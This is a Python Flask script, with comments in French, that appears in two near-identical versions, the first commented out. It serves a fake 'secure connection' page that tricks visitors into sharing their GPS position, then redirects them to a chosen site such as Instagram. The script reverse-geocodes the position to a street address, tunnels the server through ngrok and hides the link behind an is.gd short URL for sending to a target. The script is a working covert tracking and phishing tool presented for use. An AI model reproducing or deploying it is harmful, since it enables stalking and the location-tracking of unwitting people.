# from flask import Flask, request, jsonify, render_template_string
# import webbrowser
# import subprocess
# import time
# import requests
# import urllib.parse

# app = Flask(__name__)
# redirect_target_url = None

# # HTML avec bouton pour forcer l'interaction
# landing_page_template = '''
# <!DOCTYPE html>
# <html>
# <head>
#     <title>Connexion sécurisée</title>
#     <script>
#         function sendLocation(lat, lon) {
#             fetch('/capture-location', {
#                 method: 'POST',
#                 headers: { 'Content-Type': 'application/json' },
#                 body: JSON.stringify({ lat: lat, lon: lon })
#             }).finally(() => {
#                 window.location.href = "{{ redirect_url }}";
#             });
#         }

#         function captureLocation() {
#             if (navigator.geolocation) {
#                 navigator.geolocation.getCurrentPosition(
#                     function (position) {
#                         const latitude = position.coords.latitude;
#                         const longitude = position.coords.longitude;
#                         sendLocation(latitude, longitude);
#                     },
#                     function (error) {
#                         alert("❌ Impossible d'obtenir votre position. Veuillez vérifier les autorisations GPS.");
#                     },
#                     { timeout: 10000 }  // max 10s
#                 );
#             } else {
#                 alert("Votre navigateur ne supporte pas la géolocalisation.");
#             }
#         }
#     </script>
# </head>
# <body style="background-color:#f0f2f5; text-align:center; font-family:sans-serif; margin-top:80px;">
#     <img src="https://cdn-icons-png.flaticon.com/512/124/124034.png" width="60" />
#     <h3>Connexion sécurisée</h3>
#     <p>Appuyez sur le bouton ci-dessous pour continuer</p>
#     <button onclick="captureLocation()" style="padding: 12px 24px; font-size: 16px; margin-top: 20px;">Continuer</button>
# </body>
# </html>
# '''

# @app.route('/redirect')
# def redirect_page():
#     global redirect_target_url
#     if not redirect_target_url:
#         return "Aucune URL de redirection définie.", 500
#     return render_template_string(landing_page_template, redirect_url=redirect_target_url)

# @app.route('/capture-location', methods=['POST'])
# def capture_location():
#     data = request.get_json()
#     latitude = data.get('lat')
#     longitude = data.get('lon')

#     if latitude is None or longitude is None:
#         return jsonify({"status": "error", "message": "Coordonnées GPS non fournies."}), 400

#     map_url = f"https://www.google.com/maps?q={latitude},{longitude}"
#     print(f"📍 Position GPS reçue : Latitude={latitude}, Longitude={longitude}")
#     print(f"🗺️ Google Maps : {map_url}")

#     # Reverse geocoding avec Nominatim
#     try:
#         response = requests.get("https://nominatim.openstreetmap.org/reverse", params={
#             'format': 'json',
#             'lat': latitude,
#             'lon': longitude,
#             'zoom': 18,
#             'addressdetails': 1
#         }, headers={'User-Agent': 'GeoTrackerApp'})

#         if response.status_code == 200:
#             data = response.json()
#             address = data.get('display_name')
#             components = data.get('address', {})
#             house_number = components.get('house_number', '')
#             road = components.get('road', '')
#             city = components.get('city', components.get('town', components.get('village', '')))
#             country = components.get('country', '')

#             if house_number and road:
#                 print(f"📬 Adresse : {house_number} {road}, {city}, {country}")
#             else:
#                 print(f"📬 Adresse estimée : {address}")
#         else:
#             print("⚠️ Impossible de récupérer l'adresse exacte.")
#     except Exception as e:
#         print("❌ Erreur reverse geocoding :", e)

#     webbrowser.open(map_url)

#     return jsonify({
#         "status": "success",
#         "latitude": latitude,
#         "longitude": longitude,
#         "map_url": map_url
#     })

# def start_ngrok():
#     print("🚀 Lancement de ngrok sur le port 5000...")
#     subprocess.Popen(['ngrok', 'http', '5000'])
#     time.sleep(2)

#     try:
#         response = requests.get("http://127.0.0.1:4040/api/tunnels")
#         public_url = response.json()['tunnels'][0]['public_url']
#         return public_url
#     except Exception as e:
#         print("❌ Impossible de récupérer l'URL ngrok :", e)
#         return None

# def shorten_url_with_isgd(long_url):
#     try:
#         encoded_url = urllib.parse.quote(long_url, safe='')
#         response = requests.get(f"https://is.gd/create.php?format=simple&url={encoded_url}")
#         if response.status_code == 200:
#             return response.text
#         else:
#             print("⚠️ is.gd n'a pas pu raccourcir l'URL.")
#             return long_url
#     except Exception as e:
#         print("❌ Erreur is.gd :", e)
#         return long_url

# if __name__ == '__main__':
#     redirect_target_url = input("➡️ Entrez l'URL vers laquelle rediriger après géolocalisation (ex: https://instagram.com) : ").strip()

#     if not redirect_target_url.startswith("http"):
#         print("❌ URL invalide. Elle doit commencer par http:// ou https://")
#     else:
#         ngrok_url = start_ngrok()
#         if ngrok_url:
#             final_link = f"{ngrok_url}/redirect"
#             short_link = shorten_url_with_isgd(final_link)
#             print("\n🔗 Donne ce lien à ta sœur pour test :")
#             print("👉", short_link)
#         else:
#             print("⚠️ Ngrok n’a pas pu être lancé automatiquement. Lance-le manuellement avec : ngrok http 5000")

#         app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)

from flask import Flask, request, jsonify, render_template_string
import webbrowser
import subprocess
import time
import requests
import urllib.parse

app = Flask(__name__)
redirect_target_url = None

# HTML stylisé avec illustrations
landing_page_template = '''
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion sécurisée</title>
    <style>
        body {
            background: linear-gradient(to right, #ece9e6, #ffffff);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }
        .card img {
            width: 80px;
            margin-bottom: 20px;
        }
        .card h3 {
            margin-bottom: 10px;
        }
        .card p {
            font-size: 15px;
            color: #555;
        }
        .btn {
            background-color: #0057ff;
            color: white;
            padding: 12px 28px;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 20px;
        }
        .btn:hover {
            background-color: #003eb5;
        }
    </style>
    <script>
        function sendLocation(lat, lon) {
            fetch('/capture-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat: lat, lon: lon })
            }).finally(() => {
                window.location.href = "{{ redirect_url }}";
            });
        }

        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        sendLocation(latitude, longitude);
                    },
                    function (error) {
                        alert("❌ Impossible d'obtenir votre position. Veuillez vérifier les autorisations GPS.");
                    },
                    { timeout: 10000 }
                );
            } else {
                alert("Votre navigateur ne supporte pas la géolocalisation.");
            }
        }
    </script>
</head>
<body>
    <div class="card">
        <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="Icône sécurité">
        <h3>Connexion vérifiée</h3>
        <p>Pour continuer, veuillez confirmer votre présence en appuyant sur le bouton ci-dessous.</p>
        <button class="btn" onclick="captureLocation()">Continuer</button>
    </div>
</body>
</html>
'''

@app.route('/redirect')
def redirect_page():
    global redirect_target_url
    if not redirect_target_url:
        return "Aucune URL de redirection définie.", 500
    return render_template_string(landing_page_template, redirect_url=redirect_target_url)

@app.route('/capture-location', methods=['POST'])
def capture_location():
    data = request.get_json()
    latitude = data.get('lat')
    longitude = data.get('lon')

    if latitude is None or longitude is None:
        return jsonify({"status": "error", "message": "Coordonnées GPS non fournies."}), 400

    map_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    print(f"📍 Position GPS reçue : Latitude={latitude}, Longitude={longitude}")
    print(f"🗺️ Google Maps : {map_url}")

    # Reverse geocoding avec Nominatim
    try:
        response = requests.get("https://nominatim.openstreetmap.org/reverse", params={
            'format': 'json',
            'lat': latitude,
            'lon': longitude,
            'zoom': 18,
            'addressdetails': 1
        }, headers={'User-Agent': 'GeoTrackerApp'})

        if response.status_code == 200:
            data = response.json()
            address = data.get('display_name')
            components = data.get('address', {})
            house_number = components.get('house_number', '')
            road = components.get('road', '')
            city = components.get('city', components.get('town', components.get('village', '')))
            country = components.get('country', '')

            if house_number and road:
                print(f"📬 Adresse : {house_number} {road}, {city}, {country}")
            else:
                print(f"📬 Adresse estimée : {address}")
        else:
            print("⚠️ Impossible de récupérer l'adresse exacte.")
    except Exception as e:
        print("❌ Erreur reverse geocoding :", e)

    webbrowser.open(map_url)

    return jsonify({
        "status": "success",
        "latitude": latitude,
        "longitude": longitude,
        "map_url": map_url
    })

def start_ngrok():
    print("🚀 Lancement de ngrok sur le port 5000...")
    subprocess.Popen(['ngrok', 'http', '5000'])
    time.sleep(2)

    try:
        response = requests.get("http://127.0.0.1:4040/api/tunnels")
        public_url = response.json()['tunnels'][0]['public_url']
        return public_url
    except Exception as e:
        print("❌ Impossible de récupérer l'URL ngrok :", e)
        return None

def shorten_url_with_isgd(long_url):
    try:
        encoded_url = urllib.parse.quote(long_url, safe='')
        response = requests.get(f"https://is.gd/create.php?format=simple&url={encoded_url}")
        if response.status_code == 200:
            return response.text
        else:
            print("⚠️ is.gd n'a pas pu raccourcir l'URL.")
            return long_url
    except Exception as e:
        print("❌ Erreur is.gd :", e)
        return long_url

if __name__ == '__main__':
    redirect_target_url = input("➡️ Entrez l'URL vers laquelle rediriger après géolocalisation (ex: https://instagram.com) : ").strip()

    if not redirect_target_url.startswith("http"):
        print("❌ URL invalide. Elle doit commencer par http:// ou https://")
    else:
        ngrok_url = start_ngrok()
        if ngrok_url:
            final_link = f"{ngrok_url}/redirect"
            short_link = shorten_url_with_isgd(final_link)
            print("\n🔗 Donne ce lien à ta sœur pour test :")
            print("👉", short_link)
        else:
            print("⚠️ Ngrok n’a pas pu être lancé automatiquement. Lance-le manuellement avec : ngrok http 5000")

        app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
